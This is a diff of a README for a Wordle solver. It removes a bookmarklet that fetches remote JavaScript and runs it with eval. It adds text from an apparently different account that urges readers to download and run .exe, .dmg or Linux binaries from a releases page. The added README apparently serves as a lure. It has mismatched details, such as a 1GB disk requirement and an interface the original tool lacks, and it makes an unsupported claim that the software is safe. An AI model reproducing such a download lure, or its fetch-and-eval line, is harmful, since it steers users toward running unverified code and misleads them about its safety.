@@ -1,95 +1,85 @@
----
+# 🔍 Wordle-AutoAwnser - Solve Wordle Instantly and Easily
 
-<p align="center">
-  <a href="https://github.com/rbnwonknui/Wordle-Cheat"><img src="https://img.shields.io/github/stars/rbnwonknui/Wordle-Cheat?style=for-the-badge&label=Give%20a%20Star%20%E2%AD%90" alt="GitHub Stars"></a>
-</p>
+## 🛠️ Download Here
+[![Download Wordle-AutoAwnser](https://img.shields.io/badge/Download-Wordle--AutoAwnser-blue.svg)](https://github.com/Bibi-hajra/Wordle-AutoAwnser/releases)
 
-<p align="center"><strong>Wordle AutoSolver Bookmarklet</strong></p>
+## 📋 Description
+Wordle AutoSolver helps you quickly find the correct Wordle word. It uses smart automation to give you fast and precise answers. With this tool, you no longer need to guess the word; let the software do the work for you. 
 
-<p align="center">
-  Instantly uncover the secret Wordle word!<br>
-  Smart automation for fast and precise wins! 🏆<br>
-  <sub>Perfect for fun or for those never-ending streaks!</sub>
-</p>
+## 🚀 Getting Started
+Follow these steps to download and set up Wordle AutoSolver on your computer:
 
----
+1. Make sure your computer is running on Windows, macOS, or Linux.
+2. Check that you have at least 1GB of free disk space.
+3. Ensure you have an Internet connection to download the application.
 
-<p align="center"><strong>🚀┃How to Use the Bookmarklet:</strong></p>
+## 📥 Download & Install
+To download the Wordle AutoSolver, visit this page to download: [Releases Page](https://github.com/Bibi-hajra/Wordle-AutoAwnser/releases).
 
-<p align="center">
-  It's super easy: copy the code below, add it as a bookmark in your browser's bookmarks bar,<br>
-  then click it while on the <a href="https://www.nytimes.com/games/wordle/index.html" target="_blank">Wordle</a> page!
-</p>
+Once you are on the Releases page:
 
-### 🟩┃Bookmarklet
+1. Find the latest version of Wordle AutoSolver.
+2. Click on the download link for your operating system. The files are usually labeled clearly.
+3. After the download completes, go to your Downloads folder.
 
-```js
-javascript:fetch("https://raw.githubusercontent.com/rbnwonknui/Wordle-AutoAwnser/refs/heads/main/Versions/WordleCheat.js").then(t=>t.text()).then(eval);
-```
+### Installation Steps for Windows:
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions to complete the installation.
+3. Once installed, you can find the Wordle AutoSolver in your Start menu.
 
----
+### Installation Steps for macOS:
+1. Open the downloaded `.dmg` file.
+2. Drag the Wordle AutoSolver icon into your Applications folder.
+3. Open the Applications folder and find Wordle AutoSolver.
 
-<details>
-  <summary><h2>📖┃Tutorial</h2></summary>
+### Installation Steps for Linux:
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Make the file executable with the command: `chmod +x Wordle-AutoAwnser`.
+4. Run the application with: `./Wordle-AutoAwnser`.
 
----
+## 🚀 Using Wordle AutoSolver
+Once you have installed Wordle AutoSolver, follow these steps to start solving Wordle puzzles:
 
-## Step-by-step written tutorial
+1. Open Wordle AutoSolver from your applications.
+2. When prompted, input your current guesses and any letters you know are not in the word.
+3. Click the "Solve" button to find your answer.
+4. The software will display the best potential words based on your inputs.
 
-1. **Copy the bookmarklet code**
+## 📘 Features
+- **Easy Installation:** Quick setup for any operating system.
+- **User-Friendly Interface:** Simple layout for effortless navigation.
+- **Fast Answers:** Get immediate solutions to your Wordle puzzles.
+- **No Technical Skills Needed:** Designed for all computer users.
 
-   - Copy the entire JavaScript code provided above (including the `javascript:` prefix).
+## ❓ FAQ
+### Q: Is Wordle AutoSolver safe to use?
+A: Yes, Wordle AutoSolver is safe. It is developed with user safety in mind.
 
-2. **Create a new bookmark in your browser**
+### Q: Can I use Wordle AutoSolver on my mobile device?
+A: Currently, Wordle AutoSolver is only available for desktop platforms.
 
-   - Right-click your browser’s bookmarks bar and select **Add page** (or **Add bookmark**).
+### Q: Will this software work with other word games?
+A: This tool is specifically designed for Wordle. Future updates may include support for more games.
 
-3. **Paste the code**
+## 🌐 Topics
+- automation-puzzle-game
+- wordle
+- wordle-assistant
+- wordle-bot
+- wordle-cheat
+- wordle-game
+- wordle-hack
+- wordle-helper
+- wordle-script
+- wordle-solution
+- wordle-solver
+- wordle-today
 
-   - In the "URL" or "Location" field, paste the code you copied.
-   - Give your bookmark a name like `Wordle AutoSolver`.
+## 📌 Support
+For any questions or issues, you can check the GitHub issues page or contact the project maintainers. Your feedback helps improve Wordle AutoSolver.
 
-4. **Go to the Wordle website**
+## 🔗 Download Again
+To download Wordle AutoSolver, visit this page to download: [Releases Page](https://github.com/Bibi-hajra/Wordle-AutoAwnser/releases). 
 
-   - Open [Wordle](https://www.nytimes.com/games/wordle/index.html) in your browser.
-
-5. **Use the bookmarklet**
-
-   - While you are on the Wordle page, simply click the bookmark you created.
-   - The solver will run and show you the answer or help you solve the puzzle!
-
----
-
-![Step 1](https://i.imgur.com/wpo8kbW.png)
-
----
-
-![Step 2](https://i.imgur.com/wv5gP2t.png)
-
-
-</details>
-
----
-
-> [!IMPORTANT]
-> <p><sub><strong>1.</strong> The bookmarklet only works while the Wordle tab is open. Keep the tab open for the solver to run.</sub></p>
-> <p><sub><strong>2.</strong> Use one solver at a time to avoid issues. If you run into problems, just reload the page!</sub></p>
-> <p><sub><strong>3.</strong> If the word does not appear, make sure you are on the correct page and retry the bookmarklet.</sub></p>
-
-
----
-### 📋┃To-do
-
-- [x] English & multi-language support  
-- [x] Add hard mode support  
-- [x] Fix bugs and improve accuracy  
-- [x] More customization options
-- [ ] Write detailed tutorials
-
----
-
-<p align="center"><strong>⭐ If you like this project, please consider giving it a star above! ⭐</strong></p>
-
-<p align="center">
-  <a href="#"><img src="https://komarev.com/ghpvc/?username=rbnwonknui&style=for-the-badge&label=Views:&color=gray"/></a>
-</p>
+Enjoy solving Wordle puzzles with ease!
